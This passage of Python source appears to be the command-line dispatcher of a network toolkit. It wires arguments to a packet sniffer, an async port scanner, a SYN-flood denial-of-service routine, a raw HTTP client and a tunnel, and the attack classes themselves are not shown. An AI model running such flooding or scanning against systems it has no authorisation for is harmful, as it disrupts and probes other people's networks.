        tunnel_tool.add_argument("-b", "--buffer", type = int, help = "sets bufferSize, should be in (1024, 2048, 4096,...)", default = 2048)
        tunnel_tool.add_argument("-t", "--timeout", type = int, help = "sets timeout", default = 60)
        tunnel_tool.set_defaults(func = Tunnel_args)
        args = parser.parse_args()
        return args

    def invalid_args(arg : str) -> None :
        msg = "[" + Constant.RED("ERROR") + "]" + " "
        msg += Constant.RED(f"Invalid argument : \"{arg}\"") + "\n"
        msg += "[" + Constant.RED("ERROR") + "]" + " "
        msg += Constant.RED("Type : \"python hi6toolkit.py [--help | -h]\"")
        print(msg, file = sys.stderr)
        Constant.EXIT(1)
        return

    def root_access_error() -> None :
        msg = "[" + Constant.RED("ERROR") + "]" + " "
        msg += Constant.RED("ROOT ACCESS ERROR") + "\n"
        print(msg)
        Constant.EXIT(1)
        return

    def check(**kwargs : dict) -> tuple[bool, None | list] :
        nones = list()
        for k, v in kwargs.items() :
            if not v : nones.append(k)
        return (True, None) if not nones else (False, nones)

    def info_args() -> None :
        print(Constant.YELLOW(Constant.INFO))
        return

    def ensure() -> None :
        if not Constant.MODULE :
            print(Constant.YELLOW(Constant.INFO))
            input("\nPress ENTER to continue...\n")
        return

    def Sniff_args() -> None :
        global args
        args = {
            "iface" : args.iface,
            "filter_saddr" : args.saddr,
            "filter_daddr" : args.daddr,
            "tmp" : args.tmp
            }
        success, nones = check(iface = args["iface"])
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        iface = args["iface"]
        filter_saddr = args["filter_saddr"]
        filter_daddr = args["filter_daddr"]
        tmp = args["tmp"]
        if not Constant.ISROOT : root_access_error()
        ensure()
        sniff = Sniff(iface, True, tmp, filter_saddr, filter_daddr)
        for packet, _ in sniff :
            print(packet)
        return

    def Scan_args() -> None :
        global args
        args = {
            "source" : args.source,
            "host" : args.host,
            "port_range" : args.port_range,
            "timeout" : args.timeout
            }
        success, nones = check(source = args["source"], host = args["host"])
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        split_port_range : tuple = lambda x : tuple([int(i) for i in x.split("-")])
        source = socket.gethostbyname(args["source"])
        host = socket.gethostbyname(args["host"])
        port_range = split_port_range(args["port_range"])
        timeout = args["timeout"]
        if not Constant.ISROOT : root_access_error()
        ensure()
        async def wait_to_empty(n : int, buffer : set | list) -> None :
            while len(buffer) >= n :
                print("[" + Constant.RED("WAIT") + "]", end = " ")
                print("buffer is full, awaiting to empty buffer")
                await asyncio.sleep(1)
            return
        async def prepare() -> None :
            print("[" + Constant.GREEN("START") + "]", end = " ")
            print("set async event loop")
            loop = asyncio.get_event_loop()
            scan = Scan(source, host, timeout, loop)
            buffer = set()
            for port in range(port_range[0], port_range[1] + 1) :
                if len(buffer) >= 100 :
                    await wait_to_empty(100, buffer)
                if (port % 100 == 0) and (port != 0) :
                    await asyncio.gather(*buffer)
                task = loop.create_task(scan.scan(port))
                buffer.add(task)
                task.add_done_callback(buffer.discard)
            else :
                if buffer :
                    await asyncio.gather(*buffer)
                if len(scan.opens) :
                    print(f"\nopen ports({len(scan.opens)}) :\n\t", end = str())
                    print(" ".join([str(i) for i in sorted(scan.opens)]))
                if len(scan.unspecified) :
                    print(f"\nunspecified ports({len(scan.unspecified)}) :\n\t", end = str())
                    print(" ".join([str(i) for i in sorted(scan.unspecified)]))
                else : print("no open ports!")
                return
        asyncio.run(prepare())
        return

    def DoS_SYN_args() -> None :
        global args
        args = {
            "host" : args.host,
            "port" : args.port,
            "rate" : args.rate
            }
        success, nones = check(**args)
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        host = socket.gethostbyname(args["host"])
        port = args["port"]
        rate = args["rate"]
        if not Constant.ISROOT : root_access_error()
        ensure()
        flood = DoS_SYN(host, port, rate)
        flood.flood()
        return

    def HTTP_Request_args() -> None :
        global args
        args = {
            "host" : args.host,
            "port" : args.port,
            "method" : args.method,
            "header" : args.custom,
            "endpoint" : args.endpoint,
            "secure" : args.secure
            }
        success, nones = check(host = args["host"], port = args["port"], method = args["method"])
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        host = args["host"]
        port = args["port"]
        method = args["method"].upper()
        header = args["header"].replace("_", "\r\n")
        path = args["endpoint"]
        secure = args["secure"]
        ensure()
        client = HTTP_Request(host, port, method, header, path, secure)
        client.request()
        return

    def Tunnel_args() -> None :
        global args
        args = {
            "host" :  args.host,
            "port" : args.port,
            "timeout" :  args.timeout,
            "buffer" : args.buffer
            }
        success, nones = check(**args)
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        host = args["host"]
        port = args["port"]
        timeout = args["timeout"]
        buffer = args["buffer"]
        if not Constant.ISROOT and port <= 1024 : root_access_error()
        ensure()
        tunnel = Tunnel(host, port, timeout, buffer)
        gen = tunnel.tunnel()
        return

    def main() -> bool :
        global args
        print(Constant.ESCAPE + "c")
        signal.signal(signal.SIGINT, Constant.SIGNAL)
        signal.signal(signal.SIGTERM, Constant.SIGNAL)
        if not Constant.ISOS :
            print("unsupported OS")
            Constant.EXIT(1)
        args = manage_args()
        if "func" in vars(args) :
            args.func()
        else :
            invalid_args("argument NOT found")
        return True

    main()
